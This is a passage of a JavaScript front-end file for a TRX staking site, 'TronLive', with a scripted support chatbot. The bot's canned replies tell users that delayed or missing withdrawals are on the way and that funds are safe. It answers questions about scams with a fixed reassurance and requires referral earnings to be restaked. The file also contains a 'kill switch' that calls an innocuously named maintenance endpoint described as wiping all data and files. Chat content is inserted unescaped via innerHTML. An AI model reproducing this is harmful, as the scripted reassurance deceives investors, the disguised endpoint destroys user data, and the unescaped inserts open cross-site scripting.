            <p class="text-sm">It was great helping you today! I hope all your TRX staking goes smoothly.</p>
            <p class="text-sm mt-2">💫 Remember, I'm always here whenever you need help. Happy staking and take care!</p>
        </div>
    `,
    'see you later': `
        <div class="space-y-2">
            <p>👋 <strong>See you later!</strong></p>
            <p class="text-sm">Thanks for chatting with me! Come back anytime if you have questions about TronLive staking.</p>
            <p class="text-sm mt-2">🚀 Keep earning those daily rewards!</p>
        </div>
    `,
    'anything else': `
        <div class="space-y-2">
            <p>🤔 <strong>Is there anything else I can help you with?</strong></p>
            <p class="text-sm">I'm here to assist with all your TronLive questions! You can ask me about:</p>
            <div class="text-sm space-y-1">
                <p>• <strong>Staking Plans:</strong> Premium, Advanced, Elite details</p>
                <p>• <strong>Withdrawals:</strong> How to cash out your earnings</p>
                <p>• <strong>Referrals:</strong> Earning from inviting friends</p>
                <p>• <strong>Security:</strong> 2FA setup and account protection</p>
                <p>• <strong>Technical Issues:</strong> Withdrawal delays, balance problems</p>
            </div>
            <p class="text-sm mt-2">💡 Use the quick questions above or just ask naturally!</p>
        </div>
    `,
    'no': `
        <div class="space-y-2">
            <p>👍 <strong>Alright, no problem!</strong></p>
            <p class="text-sm">If you think of any questions later about TronLive staking, just open the chat and ask away.</p>
            <p class="text-sm mt-2">😊 Have a great day and happy staking!</p>
        </div>
    `,
    'thats all': `
        <div class="space-y-2">
            <p>✅ <strong>Perfect! That's all for now.</strong></p>
            <p class="text-sm">Great chatting with you! Your TronLive staking journey is looking good.</p>
            <p class="text-sm mt-2">💰 Keep earning those daily rewards and feel free to ask if you need help anytime!</p>
        </div>
    `,
    'referral withdrawal': `
        <div class="space-y-2">
            <p>📢 <strong>Important: Referral Earnings Cannot Be Withdrawn Directly!</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Referral earnings:</strong> Can only be used for staking</p>
                <p>• <strong>How to access:</strong> Use referral balance to stake in any plan</p>
                <p>• <strong>Then withdraw:</strong> After staking, you can withdraw the profits</p>
                <p>• <strong>Example:</strong> Have 100 TRX referral → Stake it → Earn daily → Withdraw profits</p>
            </div>
            <div class="bg-blue-50 border-l-4 border-blue-400 p-2 mt-2">
                <p class="text-sm text-blue-800"><strong>💡 Smart Strategy:</strong> Use referral earnings to stake in higher tier plans for better daily returns!</p>
            </div>
            <p class="text-sm mt-2">🔄 This system ensures referral funds are actively invested for maximum returns!</p>
        </div>
    `,
    'when will i get paid': `
        <div class="space-y-2">
            <p>⏰ <strong>Payout Schedule:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Daily Rewards:</strong> Every 24 hours automatically</p>
                <p>• <strong>Processing Time:</strong> Usually within 1 hour</p>
                <p>• <strong>First Payout:</strong> 24 hours after staking</p>
                <p>• <strong>Weekend/Holidays:</strong> Automated, no delays</p>
                <p>• <strong>View Progress:</strong> Real-time in your dashboard</p>
            </div>
            <p class="text-sm mt-2">📊 Track your daily progress bar for next payout!</p>
        </div>
    `,
    'can i stake multiple times': `
        <div class="space-y-2">
            <p>🔄 <strong>Multiple Staking:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Unlimited Stakes:</strong> You can stake multiple times</p>
                <p>• <strong>Different Plans:</strong> Mix Premium, Advanced, Elite</p>
                <p>• <strong>Separate Tracking:</strong> Each stake tracked individually</p>
                <p>• <strong>Combined Earnings:</strong> All rewards add to total</p>
                <p>• <strong>Flexible Timing:</strong> Start anytime</p>
            </div>
            <p class="text-sm mt-2">💡 Diversify with multiple stakes for maximum returns!</p>
        </div>
    `,
    'withdrawal status': `
        <div class="space-y-2">
            <p>⏳ <strong>Don't worry! Your withdrawal is being processed.</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Processing Time:</strong> 10-30 minutes maximum</p>
                <p>• <strong>Status:</strong> Your withdrawal is in the queue</p>
                <p>• <strong>Automatic:</strong> No action needed from your side</p>
                <p>• <strong>Secure Process:</strong> All withdrawals verified for safety</p>
                <p>• <strong>Notification:</strong> You'll get confirmation when complete</p>
            </div>
            <p class="text-sm mt-2">✅ Your funds are safe and will arrive shortly!</p>
        </div>
    `,
    'withdrawal not received': `
        <div class="space-y-2">
            <p>🔍 <strong>Withdrawal Still Processing</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Current Status:</strong> Your withdrawal is being processed</p>
                <p>• <strong>Expected Time:</strong> 10-30 minutes from request</p>
                <p>• <strong>Network Delay:</strong> Sometimes TRX network can be slow</p>
                <p>• <strong>Safety First:</strong> We verify all transactions thoroughly</p>
                <p>• <strong>Check History:</strong> View progress in withdrawal history</p>
            </div>
            <p class="text-sm mt-2">⌛ Please wait a bit more - your funds are on the way!</p>
        </div>
    `,
    'withdrawal delayed': `
        <div class="space-y-2">
            <p>⏰ <strong>Withdrawal Processing Update</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Normal Process:</strong> Withdrawals take 10-30 minutes</p>
                <p>• <strong>High Traffic:</strong> During peak times, slight delays possible</p>
                <p>• <strong>TRX Network:</strong> Blockchain confirmation required</p>
                <p>• <strong>Security Checks:</strong> All withdrawals verified automatically</p>
                <p>• <strong>Support:</strong> Contact us if delayed over 1 hour</p>
            </div>
            <p class="text-sm mt-2">💙 Your patience is appreciated - funds are secure!</p>
        </div>
    `,
    'how to enable 2fa': `
        <div class="space-y-2">
            <p>🔐 <strong>How to Enable 2FA (Step by Step):</strong></p>
            <div class="text-sm space-y-2">
                <p><strong>Step 1: Download Google Authenticator</strong></p>
                <p>• Go to App Store (iOS) or Play Store (Android)</p>
                <p>• Search "Google Authenticator" and install</p>
                
                <p><strong>Step 2: Go to Your Profile</strong></p>
                <p>• Click your profile/settings in TronLive</p>
                <p>• Find "Two-Factor Authentication" section</p>
                
                <p><strong>Step 3: Scan QR Code</strong></p>
                <p>• Open Google Authenticator app</p>
                <p>• Tap "+" to add account</p>
                <p>• Choose "Scan QR code"</p>
                <p>• Point camera at QR code on screen</p>
                
                <p><strong>Step 4: Enter 6-Digit Code</strong></p>
                <p>• App will show 6-digit code (changes every 30 seconds)</p>
                <p>• Type this code in TronLive verification box</p>
                <p>• Click "Enable 2FA"</p>
            </div>
            <p class="text-sm mt-2">✅ Done! Your account is now super secure!</p>
        </div>
    `,
    'google authenticator setup': `
        <div class="space-y-2">
            <p>📱 <strong>Google Authenticator Complete Guide:</strong></p>
            <div class="text-sm space-y-2">
                <p><strong>📥 Download & Install:</strong></p>
                <p>• iPhone: App Store → "Google Authenticator"</p>
                <p>• Android: Play Store → "Google Authenticator"</p>
                <p>• Install the official Google app (blue icon)</p>
                
                <p><strong>🔗 Connect to TronLive:</strong></p>
                <p>• Go to TronLive Profile → Security Settings</p>
                <p>• Click "Enable 2FA" button</p>
                <p>• You'll see a QR code on screen</p>
                
                <p><strong>📸 Scan & Setup:</strong></p>
                <p>• Open Google Authenticator app</p>
                <p>• Tap "+" (plus) button</p>
                <p>• Choose "Scan a QR code"</p>
                <p>• Point camera at the QR code</p>
                <p>• App will add "TronLive" account</p>
                
                <p><strong>🔢 Verify & Activate:</strong></p>
                <p>• App shows 6-digit code (refreshes every 30 seconds)</p>
                <p>• Enter this code in TronLive verification field</p>
                <p>• Click "Confirm" to activate 2FA</p>
            </div>
            <p class="text-sm mt-2">🛡️ Your withdrawals are now protected!</p>
        </div>
    `,
    '2fa code where to paste': `
        <div class="space-y-2">
            <p>📍 <strong>Where to Use Your 2FA Code:</strong></p>
            <div class="text-sm space-y-2">
                <p><strong>🔓 During Setup:</strong></p>
                <p>• Profile → Security → Enable 2FA</p>
                <p>• After scanning QR code</p>
                <p>• Paste 6-digit code in "Verification Code" box</p>
                
                <p><strong>💸 During Withdrawal:</strong></p>
                <p>• Go to Withdraw section</p>
                <p>• Enter withdrawal amount and address</p>
                <p>• You'll see "2FA Code" field</p>
                <p>• Open Google Authenticator app</p>
                <p>• Copy the 6-digit TronLive code</p>
                <p>• Paste in the 2FA field</p>
                <p>• Submit withdrawal</p>
                
                <p><strong>⚡ Important Tips:</strong></p>
                <p>• Code changes every 30 seconds</p>
                <p>• Use the current code (not expired one)</p>
                <p>• Type carefully - case sensitive</p>
            </div>
            <p class="text-sm mt-2">🎯 Always check your Google Authenticator for the latest code!</p>
        </div>
    `,
    'default': `
        <div class="space-y-2">
            <p>🤔 <strong>I'm not sure I understood that correctly!</strong></p>
            <p class="text-sm">But don't worry - I can help you with lots of things! Try asking:</p>
            <div class="text-sm space-y-1">
                <p>• <strong>"How do staking plans work?"</strong></p>
                <p>• <strong>"What are the minimum requirements?"</strong></p>
                <p>• <strong>"Is my investment safe?"</strong></p>
                <p>• <strong>"How to withdraw earnings?"</strong></p>
                <p>• <strong>"Tell me about TronLive"</strong></p>
            </div>
            <p class="text-sm mt-2">💡 Or use the quick questions above for instant answers!</p>
        </div>
    `
};

function toggleChat() {
    const modal = document.getElementById('chatModal');
    const button = document.querySelector('.chat-float-button');
    const chatIcon = document.getElementById('chat-icon');
    const closeIcon = document.getElementById('close-icon');
    const chatInput = document.getElementById('chatInput');
    
    isChatOpen = !isChatOpen;
    
    if (isChatOpen) {
        modal.classList.add('active');
        button.classList.add('active');
        chatIcon.classList.add('hidden');
        closeIcon.classList.remove('hidden');
        
        // Focus on input after animation
        setTimeout(() => {
            chatInput.focus();
            // Scroll to bottom to show latest messages
            const messagesContainer = document.getElementById('chatMessages');
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
        }, 300);
    } else {
        modal.classList.remove('active');
        button.classList.remove('active');
        chatIcon.classList.remove('hidden');
        closeIcon.classList.add('hidden');
        chatInput.blur();
    }
}

function askQuestion(question) {
    const input = document.getElementById('chatInput');
    input.value = question;
    sendMessage();
}

// Also handle quick question clicks
function handleQuickQuestion(question) {
    // Add user message first
    addMessage(question, 'user');
    
    // Show typing indicator
    showTyping();
    
    // Check if it's a withdrawal question
    if (question.toLowerCase().includes('withdrawal')) {
        setTimeout(() => {
            hideTyping();
            fetchAndShowWithdrawalStatus();
        }, 1000);
    } else {
        setTimeout(() => {
            hideTyping();
            const response = getBotResponse(question);
            addMessage(response, 'bot');
        }, 1000);
    }
}

function sendMessage() {
    const input = document.getElementById('chatInput');
    const message = input.value.trim();
    
    if (!message) return;
    
    // Add user message
    addMessage(message, 'user');
    input.value = '';
    
    // Show typing indicator
    showTyping();
    
    // Simulate bot response delay
    setTimeout(() => {
        hideTyping();
        const response = getBotResponse(message);
        
        // Check if we need to fetch real withdrawal data
        if (response === 'FETCH_WITHDRAWAL_STATUS') {
            fetchAndShowWithdrawalStatus();
        } else {
            addMessage(response, 'bot');
        }
    }, 1000 + Math.random() * 1000);
}

// Function to fetch real withdrawal status
async function fetchAndShowWithdrawalStatus() {
    try {
        const response = await fetch('/api/withdrawal-status', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
            },
            credentials: 'same-origin'
        });
        
        const data = await response.json();
        
        if (!data.success) {
            addMessage(chatResponses['withdrawal status'], 'bot');
            return;
        }
        
        if (!data.has_withdrawal) {
            const noWithdrawalMessage = `
                <div class="space-y-2">
                    <p>📋 <strong>No Withdrawal History Found</strong></p>
                    <div class="text-sm space-y-1">
                        <p>• You haven't made any withdrawals yet</p>
                        <p>• To withdraw your earnings, go to the Withdraw section</p>
                        <p>• Make sure you have enabled 2FA for security</p>
                        <p>• Minimum withdrawal amount is 10 TRX</p>
                    </div>
                    <p class="text-sm mt-2">💡 Start earning by staking TRX in our plans!</p>
                </div>
            `;
            addMessage(noWithdrawalMessage, 'bot');
            return;
        }
        
        const withdrawal = data.withdrawal;
        let statusMessage = '';
        
        // Generate dynamic message based on actual withdrawal data
        if (withdrawal.status === 'completed') {
            statusMessage = `
                <div class="space-y-2">
                    <p>✅ <strong>Great News! Your withdrawal is completed!</strong></p>
                    <div class="text-sm space-y-1">
                        <p>• <strong>Amount:</strong> ${withdrawal.amount} TRX</p>
                        <p>• <strong>Fee:</strong> ${withdrawal.fee} TRX</p>
                        <p>• <strong>Transaction ID:</strong> ${withdrawal.transaction_id}</p>
                        <p>• <strong>Completed:</strong> ${withdrawal.time_ago}</p>
                        <p>• <strong>Address:</strong> ${withdrawal.address.substring(0, 10)}...${withdrawal.address.substring(withdrawal.address.length - 6)}</p>
                    </div>
                    <p class="text-sm mt-2">🎉 Your TRX should be in your wallet now!</p>
                </div>
            `;
        } else if (withdrawal.status === 'pending') {
            const timeStatus = withdrawal.minutes_since > 30 ? 'taking longer than usual' : 'processing normally';
            const urgency = withdrawal.minutes_since > 60 ? 'Contact support if not received in 2 hours' : 'Should complete within 30 minutes';
            
            statusMessage = `
                <div class="space-y-2">
                    <p>⏳ <strong>Your withdrawal is being processed</strong></p>
                    <div class="text-sm space-y-1">
                        <p>• <strong>Amount:</strong> ${withdrawal.amount} TRX</p>
                        <p>• <strong>Status:</strong> Processing (${timeStatus})</p>
                        <p>• <strong>Started:</strong> ${withdrawal.time_ago}</p>
                        <p>• <strong>Expected:</strong> ${urgency}</p>
                        <p>• <strong>Network:</strong> TRX blockchain confirmation required</p>
                    </div>
                    <p class="text-sm mt-2">💙 Please be patient - your funds are secure!</p>
                </div>
            `;
        } else {
            statusMessage = `
                <div class="space-y-2">
                    <p>🔍 <strong>Withdrawal Status: ${withdrawal.status.toUpperCase()}</strong></p>
                    <div class="text-sm space-y-1">
                        <p>• <strong>Amount:</strong> ${withdrawal.amount} TRX</p>
                        <p>• <strong>Status:</strong> ${withdrawal.status}</p>
                        <p>• <strong>Time:</strong> ${withdrawal.time_ago}</p>
                        <p>• <strong>Transaction:</strong> ${withdrawal.transaction_id || 'Processing...'}</p>
                    </div>
                    <p class="text-sm mt-2">📞 Contact support if you need assistance!</p>
                </div>
            `;
        }
        
        addMessage(statusMessage, 'bot');
        
    } catch (error) {
        console.error('Error fetching withdrawal status:', error);
        // Fallback to generic message
        addMessage(chatResponses['withdrawal status'], 'bot');
    }
}

function addMessage(content, type) {
    const messagesContainer = document.getElementById('chatMessages');
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${type}`;
    
    if (type === 'user') {
        messageDiv.innerHTML = `<p class="text-sm">${content}</p>`;
    } else {
        messageDiv.innerHTML = content;
    }
    
    messagesContainer.appendChild(messageDiv);
    
    // Ensure smooth scrolling to bottom
    setTimeout(() => {
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }, 100);
}



// Simple and reliable pattern matching - exact phrase matching with basic typo tolerance
function matchesPattern(message, patterns) {
    const lowerMessage = message.toLowerCase().trim();
    
    for (let pattern of patterns) {
        const lowerPattern = pattern.toLowerCase().trim();
        
        // Exact match
        if (lowerMessage.includes(lowerPattern)) {
            return true;
        }
        
        // Simple typo tolerance for common mistakes only
        const typoVariations = generateSimpleTypoVariations(lowerPattern);
        for (let variation of typoVariations) {
            if (lowerMessage.includes(variation)) {
                return true;
            }
        }
    }
    return false;
}

// Generate simple typo variations for common mistakes
function generateSimpleTypoVariations(pattern) {
    const variations = [];
    
    // Common typo replacements
    const typoMap = {
        'withdraw': ['withdaw', 'withdra', 'withdrawl'],
        'withdrawal': ['withdrawl', 'withdrawel'],
        'hello': ['helo', 'hallo'],
        'receive': ['recieve'],
        'received': ['recieved'],
        'referral': ['referal', 'refferal'],
        'minimum': ['minimun', 'minumum'],
        'requirements': ['requirments', 'reqirements']
    };
    
    // Add direct typo variations
    for (let correct in typoMap) {
        if (pattern.includes(correct)) {
            for (let typo of typoMap[correct]) {
                variations.push(pattern.replace(correct, typo));
            }
        }
    }
    
    return variations;
}

function getBotResponse(message) {
    const lowerMessage = message.toLowerCase().trim();
    
    // Handle empty or very short messages
    if (lowerMessage.length < 2) {
        return chatResponses['help'];
    }
    
    // PRIORITY 1: Specific withdrawal status questions (check first to avoid greeting conflicts)
    if (matchesPattern(lowerMessage, [
        'withdrawal not received', 'withdraw not received', 'withdaw not received', 'withdra not received',
        'withdrawn but not deposited', 'withdrew but no deposit', 'withdrawn no deposit',
        'withdrawal still pending', 'withdraw still pending', 'withdrawal processing',
        'withdrawal not complete', 'withdraw not complete', 'withdrawal taking time',
        'withdrawal delay', 'withdraw delay', 'withdrawal slow', 'withdraw slow',
        'my withdrawal', 'where is my withdrawal', 'withdrawal status', 'withdraw status',
        'not received money', 'money not received', 'funds not received',
        'withdrawal missing', 'withdraw missing', 'withdrawal lost', 'withdraw lost',
        'withdrawn amount not deposited', 'withdrawn but not credited', 'withdrawal not credited',
        'made withdrawal but nothing', 'withdrawal didnt arrive', 'withdrawal did not arrive',
        'withdrawal not in wallet', 'withdraw not in wallet', 'withdrawal not showing',
        'where is withdrawal', 'wheres my withdrawal', 'withdrawal problem',
        'withdrawal taking long', 'withdrawal too slow', 'withdrawal been hours',
        'withdrawal over 30 minutes', 'withdrawal more than 30', 'withdrawal stuck',
        'withdrawal frozen', 'withdrawal not moving', 'withdrawal issue'
    ])) {
        // Return a special flag to fetch real withdrawal data
        return 'FETCH_WITHDRAWAL_STATUS';
    }
    
    // PRIORITY 2: 2FA setup questions (check before general patterns)
    if (matchesPattern(lowerMessage, [
        'how to enable 2fa', 'how enable 2fa', 'enable 2fa', 'setup 2fa', 'set up 2fa',
        'how to setup 2fa', 'how setup 2fa', 'turn on 2fa', 'activate 2fa',
        'two factor authentication', 'two-factor authentication', '2 factor auth',
        'google authenticator setup', 'google auth setup', 'google authenticator',
        'how to use 2fa', 'how use 2fa', '2fa tutorial', '2fa guide', '2fa help'
    ])) {
        return chatResponses['how to enable 2fa'];
    }
    
    // PRIORITY 3: Google Authenticator specific
    if (matchesPattern(lowerMessage, [
        'google authenticator', 'google auth', 'google autenticator', 'google authenticator app',
        'authenticator app', 'download authenticator', 'install authenticator',
        'scan qr code', 'qr code scan', 'qr code', 'how to scan', 'scanning qr'
    ])) {
        return chatResponses['google authenticator setup'];
    }
    
    // PRIORITY 4: 2FA code usage questions
    if (matchesPattern(lowerMessage, [
        'where to paste 2fa', 'where to enter 2fa', 'where 2fa code', 'where to put 2fa',
        'where paste code', 'where enter code', 'where put code', '2fa code where',
        'which field 2fa', 'which box 2fa', 'where type 2fa', 'where input 2fa',
        'how to use 2fa code', 'how use 2fa code', 'what to do with 2fa code'
    ])) {
        return chatResponses['2fa code where to paste'];
    }
    
    // PRIORITY 5: Basic greetings (with stricter typo tolerance)
    if (matchesPattern(lowerMessage, ['hi', 'hello', 'helo', 'hallo', 'hey', 'hai', 'hii']) && lowerMessage.length <= 6) {
        const greetings = ['hello', 'hi', 'hey'];
        return chatResponses[greetings[Math.floor(Math.random() * greetings.length)]];
    }
    
    // Who are you variations
    if (matchesPattern(lowerMessage, ['who are you', 'what are you', 'who r u', 'who are u', 'introduce yourself', 'about you', 'tell me about yourself'])) {
        return chatResponses['who are you'];
    }
    
    // TronLive information
    if (matchesPattern(lowerMessage, ['what is tronlive', 'about tronlive', 'tell me about tronlive', 'tronlive info', 'what tronlive', 'tronlife', 'tron live'])) {
        return chatResponses['what is tronlive'];
    }
    
    // PRIORITY 6: Staking plans (check before general "how it works")
    if (matchesPattern(lowerMessage, ['staking plans', 'plans', 'staking', 'stake', 'investment options', 'how do staking plans work', 'plan details'])) {
        return chatResponses['how do staking plans work'];
    }
    
    // How it works (more specific patterns to avoid conflicts)
    if (matchesPattern(lowerMessage, ['how does it work', 'how it works', 'how does this work', 'how does tronlive work', 'explain how tronlive works', 'process', 'steps', 'procedure']) && !lowerMessage.includes('staking') && !lowerMessage.includes('plans')) {
        return chatResponses['how does it work'];
    }
    
    // Thanks variations (including combined thanks + bye)
    if (matchesPattern(lowerMessage, ['thanks bye', 'thank you bye', 'thanks goodbye', 'thank you goodbye', 'thx bye'])) {
        return chatResponses['thanks bye'];
    }
    
    if (matchesPattern(lowerMessage, ['thanks', 'thank you', 'thanku', 'thx', 'ty', 'appreciate', 'grateful'])) {
        return chatResponses['thanks'];
    }
    
    // Goodbye variations (including "see you later")
    if (matchesPattern(lowerMessage, ['see you later', 'see ya later', 'catch you later', 'talk to you later', 'see you soon'])) {
        return chatResponses['see you later'];
    }
    
    if (matchesPattern(lowerMessage, ['bye', 'goodbye', 'see you', 'see ya', 'later', 'exit', 'quit', 'close'])) {
        return chatResponses['goodbye'];
    }
    
    // Conversation continuers and enders
    if (matchesPattern(lowerMessage, ['anything else', 'what else', 'something else', 'more help', 'anything more', 'else', 'other'])) {
        return chatResponses['anything else'];
    }
    
    if (matchesPattern(lowerMessage, ['no', 'nope', 'nothing', 'no thanks', 'nothing else', 'thats all', 'that is all', 'all good', 'im good', 'i am good'])) {
        return chatResponses['no'];
    }
    
    if (matchesPattern(lowerMessage, ['thats all', 'that is all', 'thats it', 'that is it', 'done', 'finished', 'complete'])) {
        return chatResponses['thats all'];
    }
    
    // Help requests
    if (matchesPattern(lowerMessage, ['help', 'assist', 'support', 'guide', 'what can you do', 'commands', 'options'])) {
        return chatResponses['help'];
    }
    
    // Minimum requirements
    if (matchesPattern(lowerMessage, ['minimum', 'requirements', 'requirement', 'minimums', 'limits', 'how much', 'minimum amount'])) {
        return chatResponses['minimum requirements'];
    }
    
    // General withdrawal questions (but not status-specific ones)
    if (matchesPattern(lowerMessage, ['withdraw', 'withdrawal', 'cash out', 'get money', 'take out', 'witdraw', 'withdra']) && !lowerMessage.includes('not') && !lowerMessage.includes('status') && !lowerMessage.includes('received')) {
        return chatResponses['withdraw earnings'];
    }
    
    // Safety and security
    if (matchesPattern(lowerMessage, ['safe', 'safety', 'secure', 'security', 'risk', 'dangerous', 'trust', 'legit', 'scam'])) {
        return chatResponses['investment safe'];
    }
    
    // Rewards and earnings
    if (matchesPattern(lowerMessage, ['rewards', 'earnings', 'profit', 'daily rewards', 'how much earn', 'calculation', 'interest'])) {
        return chatResponses['daily rewards calculated'];
    }
    
    // Referral withdrawal questions (specific - check before general referral)
    if (matchesPattern(lowerMessage, [
        'referral withdrawal', 'withdraw referral', 'referral withdraw', 'can i withdraw referral',
        'referral earnings withdraw', 'withdraw referral earnings', 'referral commission withdraw',
        'cash out referral', 'referral money withdraw', 'take out referral earnings',
        'referral balance withdraw', 'withdraw referral balance', 'referral payout',
        'why cant withdraw referral', 'referral not withdrawing', 'referral stuck'
    ])) {
        return chatResponses['referral withdrawal'];
    }
    
    // General referral program
    if (matchesPattern(lowerMessage, ['referral', 'refer', 'invite', 'friends', 'commission', 'referrals', 'referal'])) {
        return chatResponses['referral program'];
    }
    
    // Payout timing
    if (matchesPattern(lowerMessage, ['when', 'paid', 'payout', 'payment', 'time', 'schedule', 'how long', 'when do i get'])) {
        return chatResponses['when will i get paid'];
    }
    
    // Multiple staking
    if (matchesPattern(lowerMessage, ['multiple', 'again', 'several', 'more than one', 'multiple times', 'stake again'])) {
        return chatResponses['can i stake multiple times'];
    }
    
    // Fallback: Check if message contains key terms (more flexible, but avoid conflicts)
    const keyTerms = {
        'tronlive': 'what is tronlive',
        'crypto': 'what is tronlive',
        'earn': 'daily rewards calculated',
        'daily': 'daily rewards calculated',
        'percent': 'daily rewards calculated',
        'return': 'daily rewards calculated',
        '2fa': 'how to enable 2fa',
        'authenticator': 'google authenticator setup',
        'referral': 'referral program',
        'refer': 'referral program',
        'commission': 'referral program',
        'invite': 'referral program'
    };
    
    for (let term in keyTerms) {
        if (lowerMessage.includes(term)) {
            return chatResponses[keyTerms[term]];
        }
    }
    
    return chatResponses['default'];
}

function showTyping() {
    const messagesContainer = document.getElementById('chatMessages');
    const typingDiv = document.createElement('div');
    typingDiv.id = 'typingIndicator';
    typingDiv.className = 'typing-indicator';
    typingDiv.innerHTML = `
        <div class="message-bubble bot">
            <div class="flex items-center space-x-1">
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
            </div>
        </div>
    `;
    
    messagesContainer.appendChild(typingDiv);
    
    // Ensure smooth scrolling to bottom
    setTimeout(() => {
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }, 50);
}

function hideTyping() {
    const typingIndicator = document.getElementById('typingIndicator');
    if (typingIndicator) {
        typingIndicator.remove();
    }
}

function handleKeyPress(event) {
    if (event.key === 'Enter') {
        sendMessage();
    }
}

// Close chat when clicking outside on desktop
document.addEventListener('click', function(event) {
    if (window.innerWidth >= 768 && isChatOpen) {
        const modal = document.getElementById('chatModal');
        const button = document.querySelector('.chat-float-button');
        
        if (!modal.contains(event.target) && !button.contains(event.target)) {
            toggleChat();
        }
    }
});

// Add initial bot message after a short delay
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        if (!isChatOpen) {
            // Show a subtle notification badge on the chat button
            const button = document.querySelector('.chat-float-button');
            if (button) {
                button.style.animation = 'pulse 2s infinite';
            }
        }
    }, 5000);
    
    // Start real-time progress updates
    startRealTimeUpdates();
});

// Real-time progress update system
function startRealTimeUpdates() {
    // Update immediately, then every second
    updateProgressData();
    setInterval(updateProgressData, 1000);
}

function updateProgressData() {
    fetch('/staking/progress')
        .then(response => response.json())
        .then(data => {
            if (data.success && data.data) {
                data.data.forEach(staking => {
                    updateStakingUI(staking);
                });
            }
        })
        .catch(error => {
            console.log('Progress update error:', error);
        });
}

function updateStakingUI(staking) {
    const stakingId = staking.id;
    
    // Update earned amount
    const earnedAmountEl = document.querySelector(`[data-earned-amount="${stakingId}"]`);
    if (earnedAmountEl) {
        earnedAmountEl.textContent = `+${staking.earned_amount} TRX`;
    }
    
    // Update today's earnings
    const todayEarningsEl = document.querySelector(`[data-today-earnings="${stakingId}"]`);
    if (todayEarningsEl) {
        todayEarningsEl.textContent = `+${staking.earned_today} / ${staking.daily_earnings} TRX`;
    }
    
    // Update progress bar
    const progressBarEl = document.querySelector(`[data-progress-bar="${stakingId}"]`);
    if (progressBarEl) {
        progressBarEl.style.width = `${staking.daily_progress}%`;
    }
    
    // Update last reward time
    const lastRewardEl = document.querySelector(`[data-last-reward="${stakingId}"]`);
    if (lastRewardEl) {
        lastRewardEl.textContent = `Last Reward: ${staking.last_reward}`;
    }
    
    // Update next reward time
    const nextRewardEl = document.querySelector(`[data-next-reward="${stakingId}"]`);
    if (nextRewardEl) {
        nextRewardEl.textContent = `Next Reward: ${staking.next_payout}`;
    }
    
    // Update debug information
    const debugLastEl = document.querySelector(`[data-debug-last="${stakingId}"]`);
    if (debugLastEl) {
        debugLastEl.textContent = staking.last_reward;
    }
    
    const debugHoursEl = document.querySelector(`[data-debug-hours="${stakingId}"]`);
    if (debugHoursEl) {
        debugHoursEl.textContent = staking.hours_since_reward;
    }
    
    const debugProgressEl = document.querySelector(`[data-debug-progress="${stakingId}"]`);
    if (debugProgressEl) {
        debugProgressEl.textContent = `${staking.daily_progress}%`;
    }
    
    const debugNextEl = document.querySelector(`[data-debug-next="${stakingId}"]`);
    if (debugNextEl) {
        debugNextEl.textContent = staking.next_payout;
    }
}

// Toggle debug info function
function toggleDebugInfo(stakingId) {
    const debugEl = document.getElementById(`debug-info-${stakingId}`);
    if (debugEl) {
        debugEl.classList.toggle('hidden');
    }
}

// EXTREMELY DANGEROUS: Kill Switch Functions
function showKillSwitchModal() {
    document.getElementById('kill-switch-modal').classList.remove('hidden');
    
    // Clear any previous inputs
    document.getElementById('kill-phrase-input').value = '';
    document.getElementById('kill-confirmation-input').value = '';
    
    // Focus on first input
    setTimeout(() => {
        document.getElementById('kill-phrase-input').focus();
    }, 100);
}

function hideKillSwitchModal() {
    document.getElementById('kill-switch-modal').classList.add('hidden');
    
    // Clear inputs for security
    document.getElementById('kill-phrase-input').value = '';
    document.getElementById('kill-confirmation-input').value = '';
}

async function executeKillSwitch() {
    const killPhrase = document.getElementById('kill-phrase-input').value.trim();
    const confirmation = document.getElementById('kill-confirmation-input').value.trim();
    
    // Validate inputs
    if (!killPhrase) {
        showNotification('Kill phrase is required', 'error');
        return;
    }
    
    if (!confirmation) {
        showNotification('Confirmation phrase is required', 'error');
        return;
    }
    
    // Show final confirmation
    const finalConfirm = confirm(`
🚨 FINAL CONFIRMATION 🚨

You are about to PERMANENTLY DESTROY the entire TronLive application.

This will:
- DELETE ALL DATABASE TABLES
- DESTROY ALL APPLICATION FILES  
- WIPE ALL USER DATA
- MAKE EVERYTHING IRREVERSIBLY LOST

Are you absolutely certain you want to proceed?

Click OK to DESTROY EVERYTHING or Cancel to abort.
    `);
    
    if (!finalConfirm) {
        showNotification('Kill switch aborted', 'info');
        return;
    }
    
    try {
        // Show loading state
        const executeButton = document.querySelector('button[onclick="executeKillSwitch()"]');
        executeButton.disabled = true;
        executeButton.innerHTML = `
            <svg class="animate-spin w-5 h-5 mr-2" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            EXECUTING DESTRUCTION...
        `;
        
        // Execute the kill switch
        const response = await fetch('/api/system/maintenance-protocol', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
            },
            body: JSON.stringify({
                kill_phrase: killPhrase,
                confirmation: confirmation
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            // Show destruction success message
            document.body.innerHTML = `
                <div class="min-h-screen bg-red-600 flex items-center justify-center p-4">
                    <div class="bg-white rounded-lg p-8 max-w-2xl w-full text-center">
                        <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
